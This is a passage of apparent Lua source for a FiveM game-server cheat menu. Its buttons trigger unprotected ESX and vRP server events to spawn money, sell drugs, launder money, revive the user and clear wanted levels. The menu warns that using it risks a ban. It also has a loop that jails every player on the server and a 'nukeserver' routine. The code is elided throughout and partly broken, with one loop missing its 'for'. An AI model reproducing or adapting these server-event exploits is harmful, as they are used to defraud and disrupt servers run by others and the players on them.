            elseif MIOddhwuie.Button("~p~Sell Opium ~m~[x5]") then
                ...
                TriggerServerEvent('esx_illegal_drugs:startSellOpium')
                TriggerServerEvent('esx_illegal_drugs:startSellOpium')
            elseif MIOddhwuie.Button("~r~Stop all ~m~[Drugs]") then
                TriggerServerEvent("esx_drugs:stopHarvestCoke")
                TriggerServerEvent("esx_drugs:stopTransformCoke")
                TriggerServerEvent("esx_drugs:stopSellCoke")
                TriggerServerEvent("esx_drugs:stopHarvestMeth")
                ...
                ShowInfo("~b~~h~Info:~h~~s~ Everything is now stopped!")
            elseif MIOddhwuie.Button("Start ~g~Money ~s~Laundering 1 ~m~[x10]") then
                ...
                TriggerServerEvent("esx_blanchisseur:startWhitening", 85)
                TriggerServerEvent("esx_blanchisseur:startWhitening", 85)
            elseif MIOddhwuie.Button("Start ~g~Money Laundering~s~ 2 ~m~[Custom Amount]") then
        ...
        elseif MIOddhwuie.IsMenuOpened('money') then
            if MIOddhwuie.Button("~g~Money~s~ 1 ~y~ESX~s~ & ~y~VRP ~r~[RISK] ~s~[Works 90% on all servers]") then
                local confirm = GetKeyboardInput("Risk to get ~r~banned~s~, use it carefully! Are you Sure? ~g~Y~w~/~r~N")
                if string.lower(confirm) == "y" then
                    ...
                    ShowInfo("~b~~h~Info:~h~~s~ Operation canceled!")
                end
            elseif MIOddhwuie.Button("~g~Money~s~ 2 ~y~ESX~s~ & ~b~VRP ~r~ [RISK] ~s~[Works 90% on all servers]") then
                local confirm = GetKeyboardInput("Risk to get ~r~banned~s~, use it carefully! Are you Sure? ~g~Y~w~/~r~N")
                if string.lower(confirm) == "y" then
                    local result = GetKeyboardInput("Enter amount of money ~g~$$$", "", 100000000)
            ...
            elseif MIOddhwuie.Button("~g~Money~s~ 3 ~y~ESX~s~ & ~y~VRP ~r~[RISK] ~s~[All jobs]") then
            ...
            elseif MIOddhwuie.Button("~g~Money~s~ 4 ~y~VRP~w~ [vrp_trucker]") then
            ...
            elseif MIOddhwuie.Button("~g~Money~s~ 5 ~y~ VRP~s~ [vrp_casino]") then
            ...
            elseif MIOddhwuie.Button("~g~Money~s~ 6 ~y~ VRP~s~ [x100 Salary]") then
            ...
            elseif MIOddhwuie.Button("~g~Money~s~ 7 ~y~ VRP~s~ [100k]") then
                TriggerServerEvent("dropOff", 100000)
                TriggerServerEvent('PayForRepairNow', -100000)
            elseif MIOddhwuie.Button("~g~Money~s~ 8 ~y~ VRP ~s~&~y~ VRPEX~s~ [Ambulance Revive]") then
                local result = 9999
                if result then
            ...
            elseif MIOddhwuie.Button("~g~Money~s~ 9 ~y~ VRP ~s~&~y~ VRPEX~s~ [Ambulance Salary]") then
                local result = 9999
                if result then
            ...
            elseif MIOddhwuie.Button("~g~Money~s~ 10 ~y~ VRP & VRPEX~s~ [Ambulance Salary 2]") then
                local result = GetKeyboardInput("Enter amount of money ~g~$$$", "", 100000000)
                if result then
        ...
        elseif MIOddhwuie.IsMenuOpened('esx') then
            if MIOddhwuie.Button("~y~ESX ~s~Restore Hunger") then
                TriggerEvent("esx_status:set", "hunger", 1000000)
            elseif MIOddhwuie.Button("~y~ESX ~s~Restore Thirst") then
                TriggerEvent("esx_status:set", "thirst", 1000000)
            elseif MIOddhwuie.Button("~y~ESX ~s~Revive Self") then
                TriggerServerEvent('esx_ambulancejob:revive', GetPlayerServerId(PlayerId()))
            elseif MIOddhwuie.Button("~y~ESX ~s~Revive By ID") then
        ...
        elseif MIOddhwuie.IsMenuOpened('vrp') then
            if MIOddhwuie.Button("~y~VRP ~s~Toggle Handcuffs") then
                vRP.toggleHandcuff()
            elseif MIOddhwuie.Button("~y~VRP ~s~Clear Wanted Level") then
        ...
        elseif IsDisabledControlJustReleased(0, Keys['DELETE']) then MIOddhwuie.OpenMenu('basic')
        elseif IsControlJustReleased(0, Keys['N5']) then ToggleNoclip()
        elseif IsControlJustReleased(0, Keys['N4']) then TeleportToWaypoint()
        elseif IsControlJustReleased(0, Keys['N6']) then fixcar() end
        ...
        if Enable_Jail then
            i = 0, 450 do
                ...
                TriggerServerEvent("js:jailuser", GetPlayerServerId(i), 45 * 60, "yikes u got jailed bro.")
                TriggerServerEvent("esx-qalle-jail:jailPlayer", GetPlayerServerId(i), 45 * 60, "yikes u got jailed bro.")
                TriggerServerEvent("esx-qalle-jail:updateJailTime_n96nDDU@X?@zpf8", GetPlayerServerId(i), 45 * 60, "yikes u got jailed bro.")
            end
        end
        ...
        if nukeserver then
            Citizen.CreateThread(
                function()
                    ...
                    ShowInfo("~g~~h~Success:~h~~s~ Fucked!")
                end)
        end
